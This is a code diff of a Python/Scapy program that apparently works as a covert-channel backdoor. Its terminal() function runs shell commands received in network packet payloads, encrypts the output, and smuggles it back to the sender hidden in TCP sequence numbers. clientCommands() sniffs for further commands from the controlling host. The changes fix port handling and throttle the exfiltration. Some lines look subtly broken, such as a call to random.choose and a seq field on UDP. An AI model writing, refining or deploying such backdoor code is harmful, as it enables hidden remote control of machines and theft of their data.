@@ -279,20 +279,20 @@ def clientCommands(packet):
 			            TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=seq)
 		if (len(ports) > 0) and (packet[TCP].sport not in ports):
 			confirmPacket[TCP].sport = random.choose(ports)
-		port = confirmPacket[TCP].sport
+		port = packet[TCP].sport
 	elif packet.haslayer(UDP):
 		confirmPacket = IP(dst=packet[IP].src, id=ipid)/\
 			            UDP(sport=packet[UDP].dport, dport=packet[UDP].sport, seq=seq)
 		if (len(ports) > 0) and (packet[UDP].sport not in ports):
 			confirmPacket[UDP].sport = random.choose(ports)
-		port = confirmPacket[UDP].sport
+		port = packet[UDP].sport
 
 	send(confirmPacket, verbose=0)
 
 	try:
 		# Setting up the packet filter to limit scanned packets
 		# The stricter the filter, the fewer packets to process and therefore the better the performance
-		packetFilter = protocol + " and ip src " + packet[IP].src + " and dst port " + str(packet[TCP].sport)
+		packetFilter = protocol + " and ip src " + packet[IP].src + " and dst port " + str(port)
 		# Beginning Packet sniffing
 		sniff(filter=packetFilter, prn=commandParser(), timeout=300)
 		if len(logFile) > 0:
@@ -480,13 +480,14 @@ def getFile(packet):
 ---------------------------------------------------------------------------------------------
 '''
 def terminal(packet):
-	output = encrypt(subprocess.check_output(packet[Raw].load, stderr=subprocess.STDOUT))
+	output = encrypt(subprocess.check_output(packet[Raw].load.split(), stderr=subprocess.STDOUT))
 	print output
 	if packet.haslayer(TCP):
 		confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
 			            TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].seq+1)
 
 		for i in range(0, len(output), 4):
+			time.sleep(0.1)
 			confirmPacket[TCP].seq = 0
 			for char in output[i:i+4]:
 				confirmPacket[TCP].seq = confirmPacket[TCP].seq<<8
